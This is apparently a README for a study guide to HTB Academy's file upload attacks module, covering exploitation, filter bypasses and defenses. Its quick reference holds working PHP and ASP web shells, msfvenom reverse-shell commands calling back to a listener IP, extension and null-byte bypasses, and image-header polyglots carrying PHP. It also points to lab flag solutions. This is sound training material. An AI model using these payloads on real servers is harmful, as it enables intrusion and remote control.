# File Upload Attacks - HTB Academy Guide

> Complete guide covering file upload vulnerabilities, exploitation techniques, bypass methods, and defense strategies from HTB Academy's File Upload Attacks module.

## 📚 Table of Contents

### Core Techniques
- **[Upload Exploitation](./upload-exploitation.md)** - Web shells, reverse shells, and payload execution
- **[Client-Side Validation](./client-side-validation.md)** - Bypassing JavaScript-based frontend filtering
- **[Blacklist Filters](./blacklist-filters.md)** - Extension fuzzing and blacklist bypass techniques
- **[Basic Bypass Techniques](./basic-bypass-techniques.md)** - Whitelist bypasses, double extensions, character injection
- **[Advanced Bypass Methods](./advanced-bypass-methods.md)** - Complex filtering evasion techniques
- **[Other Upload Attacks](./other-upload-attacks.md)** - Alternative attack vectors and techniques

### Defense & Testing
- **[Prevention & Hardening](./prevention-hardening.md)** - Secure file upload implementation
- **[Skills Assessment Walkthrough](./skills-assessment-walkthrough.md)** - Complete HTB Academy lab solutions

---

## Quick Reference

### 🎯 **Essential Upload Attack Payloads**

**PHP Web Shell (Basic):**
```php
<?php system($_REQUEST['cmd']); ?>
```

**PHP Web Shell (Advanced):**
```php
<?php 
if(isset($_REQUEST['cmd'])){ 
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**ASP.NET Web Shell:**
```asp
<% eval request('cmd') %>
```

**Reverse Shell Generation:**
```bash
# PHP Reverse Shell
msfvenom -p php/reverse_php LHOST=10.10.14.55 LPORT=4444 -f raw > reverse.php

# JSP Reverse Shell  
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.55 LPORT=4444 -f raw > reverse.jsp

# ASPX Reverse Shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.55 LPORT=4444 -f aspx > reverse.aspx
```

### 🔧 **Common Bypass Techniques**
```bash
# Extension Bypasses
file.php.jpg        # Double extension
file.php%00.jpg     # Null byte injection  
file.php%20         # Space injection
file.php%0a         # Newline injection

# Content-Type Bypasses
Content-Type: image/jpeg    # While uploading PHP
Content-Type: image/png     # Bypass MIME filtering
Content-Type: image/gif     # Image masquerading

# Magic Bytes (File Signature)
GIF89a<?php system($_GET['cmd']); ?>    # GIF header + PHP
\xFF\xD8\xFF\xE0<?php system($_GET['cmd']); ?>    # JPEG header + PHP
```

### 🎯 **HTB Academy Coverage**
- ✅ **Upload Exploitation (Page 3)** - Web shells, reverse shells, msfvenom integration
- ✅ **Client-Side Validation (Page 4)** - Burp Suite interception, DevTools manipulation
- ✅ **Blacklist Filters (Page 5)** - Extension fuzzing, .phtml bypass, case sensitivity
- ✅ **Whitelist Filters (Page 6)** - Double extensions, character injection, null bytes
- ✅ **Complete Lab Solutions** - All HTB Academy flags and step-by-step walkthroughs
- ✅ **Advanced Techniques** - Server misconfigurations, automated wordlist generation

---

## Module Overview

File upload vulnerabilities occur when web applications allow users to upload files without proper validation and sanitization. These vulnerabilities can lead to:

### **💀 Critical Impacts:**
- **Remote Code Execution (RCE)** - Execute arbitrary commands on the server
- **Web Shell Deployment** - Persistent backdoor access
- **Data Exfiltration** - Access sensitive files and databases
- **Lateral Movement** - Pivot to internal network systems
- **Website Defacement** - Modify web application content

### **🎯 Attack Vectors:**
- **Unrestricted File Upload** - No validation on file types
- **Client-side Validation Only** - JavaScript-based filtering
- **Inadequate Server-side Validation** - Weak filtering mechanisms
- **File Type Confusion** - MIME type and extension mismatches
- **Path Traversal** - Directory traversal via filename manipulation

### **🛡️ Defense Strategies:**
- **Whitelist Approach** - Allow only specific file types
- **Server-side Validation** - Comprehensive file checking
- **File Content Inspection** - Magic byte verification
- **Secure Storage** - Non-executable upload directories
- **Filename Sanitization** - Remove dangerous characters

---

## HTB Academy Labs Covered

### **🧪 Practical Exercises:**
- **Upload Exploitation Lab** - Basic web shell deployment
- **Bypass Techniques Lab** - Filter evasion methods  
- **Advanced Attacks Lab** - Complex exploitation scenarios
- **Defense Implementation Lab** - Secure upload configuration

### **🎯 Skills Assessment:**
- **Target:** \`94.237.49.23:52640\`
- **Objective:** Upload web shell and retrieve \`/flag.txt\`
- **Techniques:** Extension bypass, content-type manipulation, payload execution

This module provides comprehensive coverage of file upload attack vectors, from basic exploitation to advanced bypass techniques, with practical HTB Academy lab solutions and real-world defense strategies.
